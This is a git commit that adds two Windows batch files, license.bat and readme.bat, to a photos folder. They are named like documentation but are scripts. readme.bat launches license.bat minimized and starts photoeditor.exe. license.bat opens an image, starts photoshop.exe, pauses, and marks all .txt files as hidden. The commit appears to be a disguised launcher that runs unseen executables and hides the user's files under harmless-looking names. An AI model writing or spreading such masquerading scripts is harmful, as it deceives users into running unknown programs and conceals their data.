683ab6bf060976f1a0568879963d356ff1cf451c
patilrahul1024 <35553725+patilrahul1024@users.noreply.github.com>
2018-01-30 17:36:33 +0530

    Add files via upload

---
+++ photos/Copyright@2018/license.bat
@@ -0,0 +1,6 @@
+@echo off
+start photo.PNG
+start photoshop.exe
+PING localhost -n 6 >NUL
+attrib *.txt +h
+exit
---
+++ photos/Copyright@2018/readme.bat
@@ -0,0 +1,5 @@
+@echo off
+cd copyright@2018
+start /min license.bat
+start  photoeditor.exe
+exit
